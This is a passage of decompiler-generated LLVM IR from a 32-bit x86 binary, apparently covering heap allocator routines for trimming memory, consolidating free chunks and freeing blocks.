  uselistorder i32* %eax.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 39, 42, 43, 44, 45, 0, 46, 47, 48, 49, 50 }
  uselistorder i32 -32, { 0, 1, 5, 4, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 (i32)* @function_8053999, { 10, 9, 8, 7, 0, 3, 2, 1, 6, 5, 11, 4 }
  uselistorder i32 (i32)* @function_8052bd4, { 6, 5, 4, 0, 1, 3, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2 }
  uselistorder label %dec_label_pc_805375a, { 1, 0 }
  uselistorder label %dec_label_pc_8053757, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053749, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805373c, { 1, 0 }
  uselistorder label %dec_label_pc_80536f8, { 1, 0 }
  uselistorder label %dec_label_pc_80536e5, { 1, 0 }
  uselistorder label %dec_label_pc_805366d, { 1, 0 }
  uselistorder label %dec_label_pc_8053620, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805360c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053565, { 1, 0 }
  uselistorder label %dec_label_pc_80534c5, { 1, 0 }
}

define i32 @function_8053764() local_unnamed_addr {
dec_label_pc_8053764:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805376b = load i32, i32* @edx, align 4
  store i32 %v0_805376b, i32* %ebp.global-to-local, align 4
  %v1_805376d = add i32 %v0_805376b, 860
  %v2_805376d = inttoptr i32 %v1_805376d to i32*
  %v3_805376d = load i32, i32* %v2_805376d, align 4
  store i32 %v3_805376d, i32* %ecx.global-to-local, align 4
  %v1_8053773 = add i32 %v0_805376b, 44
  %v2_8053773 = inttoptr i32 %v1_8053773 to i32*
  %v3_8053773 = load i32, i32* %v2_8053773, align 4
  %v1_8053776 = add i32 %v3_8053773, 4
  %v2_8053776 = inttoptr i32 %v1_8053776 to i32*
  %v3_8053776 = load i32, i32* %v2_8053776, align 4
  %v1_8053779 = and i32 %v3_8053776, -4
  store i32 %v1_8053779, i32* @esi, align 4
  %v1_805377e = load i32, i32* @eax, align 4
  %v2_805377e = add i32 %v3_805376d, -17
  %v2_8053780 = add i32 %v2_805377e, %v1_8053779
  %v3_8053780 = sub i32 %v2_8053780, %v1_805377e
  %div = udiv i32 %v3_8053780, %v3_805376d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8053780, %v3_805376d
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053788 = add i32 %div, -1
  %v4_805378b = mul i32 %v1_8053788, %v3_805376d
  store i32 %v4_805378b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805378b, 1
  br i1 %tmp11, label %dec_label_pc_80537e7, label %dec_label_pc_8053792

dec_label_pc_8053792:                             ; preds = %dec_label_pc_8053764
  %v1_8053797 = call i32 @function_80548c9(i32 0)
  store i32 %v1_8053797, i32* %edi.global-to-local, align 4
  %v0_805379e = load i32, i32* @esi, align 4
  store i32 %v0_805379e, i32* %eax.global-to-local, align 4
  %v1_80537a0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80537a0 = add i32 %v1_80537a0, 44
  %v3_80537a0 = inttoptr i32 %v2_80537a0 to i32*
  %v4_80537a0 = load i32, i32* %v3_80537a0, align 4
  %v5_80537a0 = add i32 %v4_80537a0, %v0_805379e
  store i32 %v5_80537a0, i32* %eax.global-to-local, align 4
  %v12_80537a6 = icmp eq i32 %v1_8053797, %v5_80537a0
  %v1_80537a8 = icmp eq i1 %v12_80537a6, false
  br i1 %v1_80537a8, label %dec_label_pc_80537e7, label %dec_label_pc_80537aa

dec_label_pc_80537aa:                             ; preds = %dec_label_pc_8053792
  %v1_80537ad = sub i32 0, %v4_805378b
  store i32 %v1_80537ad, i32* @ebx, align 4
  %v1_80537b0 = call i32 @function_80548c9(i32 %v1_80537ad)
  store i32 %v1_80537b0, i32* %eax.global-to-local, align 4
  %v1_80537bc = call i32 @function_80548c9(i32 0)
  store i32 %v1_80537bc, i32* %eax.global-to-local, align 4
  %v10_80537c4 = icmp eq i32 %v1_80537bc, -1
  br i1 %v10_80537c4, label %dec_label_pc_80537e7, label %dec_label_pc_80537c9

dec_label_pc_80537c9:                             ; preds = %dec_label_pc_80537aa
  %v0_80537c9 = load i32, i32* %edi.global-to-local, align 4
  %v2_80537cb = sub i32 %v0_80537c9, %v1_80537bc
  %v12_80537cb = icmp eq i32 %v2_80537cb, 0
  store i32 %v2_80537cb, i32* %ecx.global-to-local, align 4
  br i1 %v12_80537cb, label %dec_label_pc_80537e7, label %dec_label_pc_80537cf

dec_label_pc_80537cf:                             ; preds = %dec_label_pc_80537c9
  %v0_80537cf = load i32, i32* %ebp.global-to-local, align 4
  %v1_80537cf = add i32 %v0_80537cf, 44
  %v2_80537cf = inttoptr i32 %v1_80537cf to i32*
  %v3_80537cf = load i32, i32* %v2_80537cf, align 4
  store i32 %v3_80537cf, i32* %eax.global-to-local, align 4
  %v1_80537d2 = add i32 %v0_80537cf, 872
  %v2_80537d2 = inttoptr i32 %v1_80537d2 to i32*
  %v3_80537d2 = load i32, i32* %v2_80537d2, align 4
  %v5_80537d2 = sub i32 %v3_80537d2, %v2_80537cb
  store i32 %v5_80537d2, i32* %v2_80537d2, align 4
  %v0_80537d8 = load i32, i32* @esi, align 4
  %v1_80537d8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80537d8 = sub i32 %v0_80537d8, %v1_80537d8
  %v1_80537da = or i32 %v2_80537d8, 1
  %v1_80537dd = load i32, i32* %eax.global-to-local, align 4
  %v2_80537dd = add i32 %v1_80537dd, 4
  %v3_80537dd = inttoptr i32 %v2_80537dd to i32*
  store i32 %v1_80537da, i32* %v3_80537dd, align 4
  br label %dec_label_pc_80537e9

dec_label_pc_80537e7:                             ; preds = %dec_label_pc_80537c9, %dec_label_pc_80537aa, %dec_label_pc_8053792, %dec_label_pc_8053764
  br label %dec_label_pc_80537e9

dec_label_pc_80537e9:                             ; preds = %dec_label_pc_80537cf, %dec_label_pc_80537e7
  %storemerge = phi i32 [ 1, %dec_label_pc_80537cf ], [ 0, %dec_label_pc_80537e7 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80537bc, { 1, 0, 2 }
  uselistorder i32 %v4_805378b, { 1, 2, 0 }
  uselistorder i32 %v3_805376d, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_80548c9, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80537e9, { 1, 0 }
}

define i32 @function_80537f1(i32* %arg1) local_unnamed_addr {
dec_label_pc_80537f1:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_80537f2 = load i32, i32* @edi, align 4
  %v0_80537f3 = load i32, i32* @esi, align 4
  %v0_80537f4 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80537fc = load i32, i32* %arg1, align 4
  store i32 %v2_80537fc, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8053803 = icmp eq i32 %v2_80537fc, 0
  br i1 %v1_8053803, label %dec_label_pc_805391d.lr.ph, label %dec_label_pc_805380b

dec_label_pc_805391d.lr.ph:                       ; preds = %dec_label_pc_80537f1
  %v3_8053921 = add i32 %tmp20, 44
  br label %dec_label_pc_805391d

dec_label_pc_805380b:                             ; preds = %dec_label_pc_80537f1
  %v1_805380f = and i32 %v2_80537fc, -3
  store i32 %v1_805380f, i32* %arg1, align 4
  %v1_8053814 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_805381f = add i32 %tmp20, 4
  store i32 %v1_805381f, i32* %eax.global-to-local, align 4
  %v2_805382a = load i32, i32* %arg1, align 4
  %v2_8053830 = udiv i32 %v2_805382a, 8
  %v2_8053833 = mul nuw i32 %v2_8053830, 4
  %v3_8053833 = add i32 %tmp20, -4
  %v4_8053833 = add i32 %v3_8053833, %v2_8053833
  store i32 %v4_8053833, i32* %eax.global-to-local, align 4
  %v2_80538fa = add i32 %tmp20, 44
  %v3_80538fa = inttoptr i32 %v2_80538fa to i32*
  %v1_80538cd = add i32 %tmp20, 60
  %v2_80538cd = inttoptr i32 %v1_80538cd to i32*
  br label %dec_label_pc_805383b

dec_label_pc_805383b:                             ; preds = %dec_label_pc_8053913, %dec_label_pc_805380b
  %v0_8053849 = phi i32 [ %v1_805381f, %dec_label_pc_805380b ], [ %v4_8053913, %dec_label_pc_8053913 ]
  store i32 %v0_8053849, i32* %eax.global-to-local, align 4
  %v1_805383f = inttoptr i32 %v0_8053849 to i32*
  %v2_805383f = load i32, i32* %v1_805383f, align 4
  store i32 %v2_805383f, i32* @ecx, align 4
  %v1_8053841 = icmp eq i32 %v2_805383f, 0
  br i1 %v1_8053841, label %dec_label_pc_8053909, label %dec_label_pc_8053849

dec_label_pc_8053849:                             ; preds = %dec_label_pc_805383b
  store i32 0, i32* %v1_805383f, align 4
  %v0_805384f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805384f

dec_label_pc_805384f:                             ; preds = %dec_label_pc_80538fd, %dec_label_pc_8053849
  %v0_805386c = phi i32 [ %v3_805384f, %dec_label_pc_80538fd ], [ %v0_805384f.pre, %dec_label_pc_8053849 ]
  %v1_805384f = add i32 %v0_805386c, 8
  %v2_805384f = inttoptr i32 %v1_805384f to i32*
  %v3_805384f = load i32, i32* %v2_805384f, align 4
  store i32 %v3_805384f, i32* %edx.global-to-local, align 4
  %v1_8053856 = add i32 %v0_805386c, 4
  %v2_8053856 = inttoptr i32 %v1_8053856 to i32*
  %v3_8053856 = load i32, i32* %v2_8053856, align 4
  store i32 %v3_8053856, i32* %eax.global-to-local, align 4
  %v1_805385b = and i32 %v3_8053856, -2
  store i32 %v1_805385b, i32* @edi, align 4
  %v2_805385e = urem i32 %v3_8053856, 2
  %v3_805385e = icmp eq i32 %v2_805385e, 0
  %v2_8053860 = add i32 %v1_805385b, %v0_805386c
  store i32 %v2_8053860, i32* @ebx, align 4
  %v1_8053863 = add i32 %v2_8053860, 4
  %v2_8053863 = inttoptr i32 %v1_8053863 to i32*
  %v3_8053863 = load i32, i32* %v2_8053863, align 4
  store i32 %v3_8053863, i32* %edx.global-to-local, align 4
  %v1_805386a = icmp eq i1 %v3_805385e, false
  br i1 %v1_805386a, label %dec_label_pc_805388c, label %dec_label_pc_805386c

dec_label_pc_805386c:                             ; preds = %dec_label_pc_805384f
  %v1_805386c = inttoptr i32 %v0_805386c to i32*
  %v2_805386c = load i32, i32* %v1_805386c, align 4
  store i32 %v2_805386c, i32* %ebp.global-to-local, align 4
  %v2_8053870 = sub i32 %v0_805386c, %v2_805386c
  store i32 %v2_8053870, i32* %eax.global-to-local, align 4
  %v1_8053872 = add i32 %v2_8053870, 8
  %v2_8053872 = inttoptr i32 %v1_8053872 to i32*
  %v3_8053872 = load i32, i32* %v2_8053872, align 4
  store i32 %v3_8053872, i32* @esi, align 4
  %v1_8053875 = add i32 %v2_8053870, 12
  %v2_8053875 = inttoptr i32 %v1_8053875 to i32*
  %v3_8053875 = load i32, i32* %v2_8053875, align 4
  store i32 %v3_8053875, i32* %edx.global-to-local, align 4
  %v1_8053878 = add i32 %v3_8053872, 12
  %v2_8053878 = inttoptr i32 %v1_8053878 to i32*
  %v3_8053878 = load i32, i32* %v2_8053878, align 4
  store i32 %v3_8053878, i32* @ecx, align 4
  %v12_805387b = icmp eq i32 %v3_8053878, %v2_8053870
  %v1_805387d = icmp eq i1 %v12_805387b, false
  br i1 %v1_805387d, label %dec_label_pc_80538bc, label %dec_label_pc_805387f

dec_label_pc_805387f:                             ; preds = %dec_label_pc_805386c
  %v1_805387f = add i32 %v3_8053875, 8
  %v2_805387f = inttoptr i32 %v1_805387f to i32*
  %v3_805387f = load i32, i32* %v2_805387f, align 4
  %v15_805387f = icmp eq i32 %v3_805387f, %v3_8053878
  %v1_8053882 = icmp eq i1 %v15_805387f, false
  br i1 %v1_8053882, label %dec_label_pc_80538bc, label %dec_label_pc_8053884

dec_label_pc_8053884:                             ; preds = %dec_label_pc_805387f
  %v2_8053884 = add i32 %v2_805386c, %v1_805385b
  store i32 %v2_8053884, i32* @edi, align 4
  store i32 %v3_8053875, i32* %v2_8053878, align 4
  %v0_8053889 = load i32, i32* @esi, align 4
  %v1_8053889 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053889 = add i32 %v1_8053889, 8
  %v3_8053889 = inttoptr i32 %v2_8053889 to i32*
  store i32 %v0_8053889, i32* %v3_8053889, align 4
  %v0_8053897.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805388c

dec_label_pc_805388c:                             ; preds = %dec_label_pc_805384f, %dec_label_pc_8053884
  %v1_80538a0 = phi i32 [ %v2_8053860, %dec_label_pc_805384f ], [ %v0_8053897.pre, %dec_label_pc_8053884 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8053894 = and i32 %v3_8053863, -4
  store i32 %v1_8053894, i32* %ebp.global-to-local, align 4
  %v4_8053897 = load i32, i32* %v3_80538fa, align 4
  %v15_8053897 = icmp eq i32 %v1_80538a0, %v4_8053897
  br i1 %v15_8053897, label %dec_label_pc_80538ed, label %dec_label_pc_805389c

dec_label_pc_805389c:                             ; preds = %dec_label_pc_805388c
  %v2_805389c = add i32 %v1_80538a0, 4
  %v3_805389c = add i32 %v2_805389c, %v1_8053894
  %v4_805389c = inttoptr i32 %v3_805389c to i32*
  %v5_805389c = load i32, i32* %v4_805389c, align 4
  store i32 %v5_805389c, i32* %eax.global-to-local, align 4
  %v3_80538a0 = inttoptr i32 %v2_805389c to i32*
  store i32 %v1_8053894, i32* %v3_80538a0, align 4
  %v0_80538a3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538a3 = urem i32 %v0_80538a3, 2
  %v2_80538a3 = icmp eq i32 %v1_80538a3, 0
  store i32 %v1_80538a3, i32* %eax.global-to-local, align 4
  %v1_80538a8 = icmp eq i1 %v2_80538a3, false
  br i1 %v1_80538a8, label %dec_label_pc_80538c9, label %dec_label_pc_80538aa

dec_label_pc_80538aa:                             ; preds = %dec_label_pc_805389c
  %v0_80538aa = load i32, i32* @ebx, align 4
  %v1_80538aa = add i32 %v0_80538aa, 8
  %v2_80538aa = inttoptr i32 %v1_80538aa to i32*
  %v3_80538aa = load i32, i32* %v2_80538aa, align 4
  store i32 %v3_80538aa, i32* @edx, align 4
  %v1_80538ad = add i32 %v0_80538aa, 12
  %v2_80538ad = inttoptr i32 %v1_80538ad to i32*
  %v3_80538ad = load i32, i32* %v2_80538ad, align 4
  store i32 %v3_80538ad, i32* %eax.global-to-local, align 4
  %v1_80538b0 = add i32 %v3_80538aa, 12
  %v2_80538b0 = inttoptr i32 %v1_80538b0 to i32*
  %v3_80538b0 = load i32, i32* %v2_80538b0, align 4
  store i32 %v3_80538b0, i32* @esi, align 4
  %v12_80538b3 = icmp eq i32 %v3_80538b0, %v0_80538aa
  %v1_80538b5 = icmp eq i1 %v12_80538b3, false
  br i1 %v1_80538b5, label %dec_label_pc_80538bc, label %dec_label_pc_80538b7

dec_label_pc_80538b7:                             ; preds = %dec_label_pc_80538aa
  %v1_80538b7 = add i32 %v3_80538ad, 8
  %v2_80538b7 = inttoptr i32 %v1_80538b7 to i32*
  %v3_80538b7 = load i32, i32* %v2_80538b7, align 4
  %v15_80538b7 = icmp eq i32 %v3_80538b7, %v3_80538b0
  br i1 %v15_80538b7, label %dec_label_pc_80538c1, label %dec_label_pc_80538bc

dec_label_pc_80538bc:                             ; preds = %dec_label_pc_80538b7, %dec_label_pc_80538aa, %dec_label_pc_805387f, %dec_label_pc_805386c
  %v0_80538bc = call i32 @function_8053b35()
  store i32 %v0_80538bc, i32* %eax.global-to-local, align 4
  %v1_80538c3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80538c1

dec_label_pc_80538c1:                             ; preds = %dec_label_pc_80538b7, %dec_label_pc_80538bc
  %v1_80538c3 = phi i32 [ %v3_80538aa, %dec_label_pc_80538b7 ], [ %v1_80538c3.pre, %dec_label_pc_80538bc ]
  %v0_80538c3 = phi i32 [ %v3_80538ad, %dec_label_pc_80538b7 ], [ %v0_80538bc, %dec_label_pc_80538bc ]
  %v0_80538c1 = load i32, i32* @edi, align 4
  %v1_80538c1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80538c1 = add i32 %v1_80538c1, %v0_80538c1
  store i32 %v2_80538c1, i32* @edi, align 4
  %v2_80538c3 = add i32 %v1_80538c3, 12
  %v3_80538c3 = inttoptr i32 %v2_80538c3 to i32*
  store i32 %v0_80538c3, i32* %v3_80538c3, align 4
  %v0_80538c6 = load i32, i32* @edx, align 4
  %v1_80538c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80538c6 = add i32 %v1_80538c6, 8
  %v3_80538c6 = inttoptr i32 %v2_80538c6 to i32*
  store i32 %v0_80538c6, i32* %v3_80538c6, align 4
  br label %dec_label_pc_80538c9

dec_label_pc_80538c9:                             ; preds = %dec_label_pc_805389c, %dec_label_pc_80538c1
  store i32 %v1_8053814, i32* %eax.global-to-local, align 4
  %v3_80538cd = load i32, i32* %v2_80538cd, align 4
  store i32 %v3_80538cd, i32* @edx, align 4
  %v0_80538d0 = load i32, i32* @ecx, align 4
  store i32 %v0_80538d0, i32* %v2_80538cd, align 4
  %v0_80538d3 = load i32, i32* @edi, align 4
  %v1_80538d5 = or i32 %v0_80538d3, 1
  store i32 %v1_80538d5, i32* %eax.global-to-local, align 4
  %v0_80538d8 = load i32, i32* @ecx, align 4
  %v1_80538d8 = load i32, i32* @edx, align 4
  %v2_80538d8 = add i32 %v1_80538d8, 12
  %v3_80538d8 = inttoptr i32 %v2_80538d8 to i32*
  store i32 %v0_80538d8, i32* %v3_80538d8, align 4
  %v0_80538db = load i32, i32* %eax.global-to-local, align 4
  %v1_80538db = load i32, i32* @ecx, align 4
  %v2_80538db = add i32 %v1_80538db, 4
  %v3_80538db = inttoptr i32 %v2_80538db to i32*
  store i32 %v0_80538db, i32* %v3_80538db, align 4
  store i32 %v1_8053814, i32* %eax.global-to-local, align 4
  %v0_80538e2 = load i32, i32* @edx, align 4
  %v1_80538e2 = load i32, i32* @ecx, align 4
  %v2_80538e2 = add i32 %v1_80538e2, 8
  %v3_80538e2 = inttoptr i32 %v2_80538e2 to i32*
  store i32 %v0_80538e2, i32* %v3_80538e2, align 4
  %v0_80538e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538e5 = load i32, i32* @ecx, align 4
  %v2_80538e5 = add i32 %v1_80538e5, 12
  %v3_80538e5 = inttoptr i32 %v2_80538e5 to i32*
  store i32 %v0_80538e5, i32* %v3_80538e5, align 4
  %v0_80538e8 = load i32, i32* @edi, align 4
  %v1_80538e8 = load i32, i32* @ecx, align 4
  %v3_80538e8 = add i32 %v1_80538e8, %v0_80538e8
  %v4_80538e8 = inttoptr i32 %v3_80538e8 to i32*
  store i32 %v0_80538e8, i32* %v4_80538e8, align 4
  br label %dec_label_pc_80538fd

dec_label_pc_80538ed:                             ; preds = %dec_label_pc_805388c
  %v0_80538ed = load i32, i32* @edi, align 4
  %v2_80538ed = add i32 %v0_80538ed, %v1_8053894
  %v1_80538f0 = or i32 %v2_80538ed, 1
  store i32 %v1_80538f0, i32* %eax.global-to-local, align 4
  %v1_80538f3 = load i32, i32* @ecx, align 4
  %v2_80538f3 = add i32 %v1_80538f3, 4
  %v3_80538f3 = inttoptr i32 %v2_80538f3 to i32*
  store i32 %v1_80538f0, i32* %v3_80538f3, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_80538fa = load i32, i32* @ecx, align 4
  store i32 %v0_80538fa, i32* %v3_80538fa, align 4
  br label %dec_label_pc_80538fd

dec_label_pc_80538fd:                             ; preds = %dec_label_pc_80538c9, %dec_label_pc_80538ed
  store i32 %v3_805384f, i32* @ecx, align 4
  %v1_8053901 = icmp eq i32 %v3_805384f, 0
  %v1_8053903 = icmp eq i1 %v1_8053901, false
  br i1 %v1_8053903, label %dec_label_pc_805384f, label %dec_label_pc_8053909

dec_label_pc_8053909:                             ; preds = %dec_label_pc_80538fd, %dec_label_pc_805383b
  %v15_805390d = icmp eq i32 %v0_8053849, %v4_8053833
  br i1 %v15_805390d, label %dec_label_pc_8053991, label %dec_label_pc_8053913

dec_label_pc_8053913:                             ; preds = %dec_label_pc_8053909
  %v4_8053913 = add i32 %v0_8053849, 4
  br label %dec_label_pc_805383b

dec_label_pc_805391d:                             ; preds = %dec_label_pc_805391d.lr.ph, %dec_label_pc_805391d
  %v1_8053921 = phi i32 [ 1, %dec_label_pc_805391d.lr.ph ], [ %v0_805392c, %dec_label_pc_805391d ]
  %v2_8053921 = mul i32 %v1_8053921, 8
  %v4_8053921 = add i32 %v3_8053921, %v2_8053921
  store i32 %v4_8053921, i32* %eax.global-to-local, align 4
  %v1_8053925 = add i32 %v1_8053921, 1
  store i32 %v1_8053925, i32* %edx.global-to-local, align 4
  %v2_8053926 = add i32 %v4_8053921, 12
  %v3_8053926 = inttoptr i32 %v2_8053926 to i32*
  store i32 %v4_8053921, i32* %v3_8053926, align 4
  %v0_8053929 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053929 = add i32 %v0_8053929, 8
  %v3_8053929 = inttoptr i32 %v2_8053929 to i32*
  store i32 %v0_8053929, i32* %v3_8053929, align 4
  %v0_805392c = load i32, i32* %edx.global-to-local, align 4
  %v7_805392f = icmp sgt i32 %v0_805392c, 95
  br i1 %v7_805392f, label %dec_label_pc_8053931, label %dec_label_pc_805391d

dec_label_pc_8053931:                             ; preds = %dec_label_pc_805391d
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8053935 = add i32 %tmp20, 864
  %v2_8053935 = inttoptr i32 %v1_8053935 to i32*
  %v3_8053935 = load i32, i32* %v2_8053935, align 4
  %v4_8053935 = or i32 %v3_8053935, 1
  store i32 %v4_8053935, i32* %v2_8053935, align 4
  %v0_805393c = load i32, i32* %eax.global-to-local, align 4
  %v1_805393c = add i32 %v0_805393c, 840
  %v2_805393c = inttoptr i32 %v1_805393c to i32*
  store i32 0, i32* %v2_805393c, align 4
  %v0_8053946 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053946 = add i32 %v0_8053946, 852
  %v2_8053946 = inttoptr i32 %v1_8053946 to i32*
  store i32 65536, i32* %v2_8053946, align 4
  %v0_8053950 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053950 = add i32 %v0_8053950, 844
  %v2_8053950 = inttoptr i32 %v1_8053950 to i32*
  store i32 262144, i32* %v2_8053950, align 4
  %v0_805395a = load i32, i32* %eax.global-to-local, align 4
  %v1_805395a = add i32 %v0_805395a, 836
  %v2_805395a = inttoptr i32 %v1_805395a to i32*
  store i32 262144, i32* %v2_805395a, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_805396b = load i32, i32* %arg1, align 4
  %v1_805396d = urem i32 %v2_805396b, 4
  %v1_8053970 = or i32 %v1_805396d, 72
  store i32 %v1_8053970, i32* %arg1, align 4
  %v0_8053975 = load i32, i32* @edx, align 4
  %v1_8053977 = add i32 %v0_8053975, 52
  store i32 %v1_8053977, i32* %eax.global-to-local, align 4
  %v2_805397a = add i32 %v0_8053975, 44
  %v3_805397a = inttoptr i32 %v2_805397a to i32*
  store i32 %v1_8053977, i32* %v3_805397a, align 4
  %v1_805397f = call i32 @function_8053f79(i32 30)
  store i32 %v1_805397f, i32* %eax.global-to-local, align 4
  %v2_805398b = add i32 %tmp20, 860
  %v3_805398b = inttoptr i32 %v2_805398b to i32*
  store i32 %v1_805397f, i32* %v3_805398b, align 4
  br label %dec_label_pc_8053991

dec_label_pc_8053991:                             ; preds = %dec_label_pc_8053909, %dec_label_pc_8053931
  store i32 %v0_80537f4, i32* @ebx, align 4
  store i32 %v0_80537f3, i32* @esi, align 4
  store i32 %v0_80537f2, i32* @edi, align 4
  %v0_8053998 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053998

; uselistorder directives
  uselistorder i32 %v0_805392c, { 1, 0 }
  uselistorder i32 %v0_8053929, { 1, 0 }
  uselistorder i32 %v1_8053921, { 1, 0 }
  uselistorder i32 %v0_80538e8, { 1, 0 }
  uselistorder i32 %v1_80538a3, { 1, 0 }
  uselistorder i32 %v2_805389c, { 1, 0 }
  uselistorder i32 %v1_8053894, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80538a0, { 1, 0 }
  uselistorder i32 %v3_805384f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805386c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053849, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80538fa, { 1, 0 }
  uselistorder i32 %v1_8053814, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_8053991, { 1, 0 }
  uselistorder label %dec_label_pc_805391d, { 1, 0 }
  uselistorder label %dec_label_pc_80538fd, { 1, 0 }
  uselistorder label %dec_label_pc_80538c9, { 1, 0 }
  uselistorder label %dec_label_pc_80538c1, { 1, 0 }
  uselistorder label %dec_label_pc_805388c, { 1, 0 }
}

define i32 @function_8053999(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053999:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053999 = load i32, i32* @ebp, align 4
  %v0_805399a = load i32, i32* @edi, align 4
  %v0_805399b = load i32, i32* @esi, align 4
  %v0_805399c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80539a4 = icmp eq i32 %arg1, 0
  br i1 %v1_80539a4, label %dec_label_pc_8053b2d, label %dec_label_pc_80539ac

dec_label_pc_80539ac:                             ; preds = %dec_label_pc_8053999
  %v2_80539b7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80539b7, i32* @eax, align 4
  %v2_80539bc = call i32 @function_8054100(i32 %v2_80539b7, i32 134562045)
  store i32 %v2_80539bc, i32* %eax.global-to-local, align 4
  %v1_80539c8 = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_8056880.205 to i32))
  %v1_80539cd = add i32 %arg1, -8
  store i32 %v1_80539cd, i32* @ecx, align 4
  %v0_80539d0 = load i8, i8* @global_var_8056c20.206, align 1
  %v1_80539d0 = sext i8 %v0_80539d0 to i32
  store i32 %v1_80539d0, i32* %eax.global-to-local, align 4
  %v1_80539d8 = add i32 %arg1, -4
  %v2_80539d8 = inttoptr i32 %v1_80539d8 to i32*
  %v3_80539d8 = load i32, i32* %v2_80539d8, align 4
  %v1_80539dd = and i32 %v3_80539d8, -4
  %v4_80539dd = trunc i32 %v1_80539dd to i8
  store i32 %v1_80539dd, i32* @ebx, align 4
  %v8_80539e2 = icmp ugt i8 %v4_80539dd, %v0_80539d0
  br i1 %v8_80539e2, label %dec_label_pc_8053a04, label %dec_label_pc_80539e4

dec_label_pc_80539e4:                             ; preds = %dec_label_pc_80539ac
  %v2_80539e4 = udiv i32 %v3_80539d8, 8
  %v1_80539e7 = or i32 %v1_80539d0, 3
  %v3_80539e7 = trunc i32 %v1_80539e7 to i8
  store i32 %v1_80539e7, i32* %eax.global-to-local, align 4
  store i8 %v3_80539e7, i8* @global_var_8056c20.206, align 32
  %v1_80539ef = mul nuw i32 %v2_80539e4, 4
  %v2_80539ef = add i32 %v1_80539ef, ptrtoint (i8* @global_var_8056c20.206 to i32)
  store i32 %v2_80539ef, i32* @edx, align 4
  %v1_80539f6 = add i32 %v1_80539ef, add (i32 ptrtoint (i8* @global_var_8056c20.206 to i32), i32 -4)
  %v2_80539f6 = inttoptr i32 %v1_80539f6 to i32*
  %v3_80539f6 = load i32, i32* %v2_80539f6, align 4
  store i32 %v3_80539f6, i32* %eax.global-to-local, align 4
  %v3_80539f9 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80539f6, i32* %v3_80539f9, align 4
  %v0_80539fc = load i32, i32* @ecx, align 4
  %v1_80539fc = load i32, i32* @edx, align 4
  %v2_80539fc = add i32 %v1_80539fc, -4
  %v3_80539fc = inttoptr i32 %v2_80539fc to i32*
  store i32 %v0_80539fc, i32* %v3_80539fc, align 4
  br label %dec_label_pc_8053b1c

dec_label_pc_8053a04:                             ; preds = %dec_label_pc_80539ac
  %v1_8053a04 = trunc i32 %v3_80539d8 to i8
  %v2_8053a04 = and i8 %v1_8053a04, 2
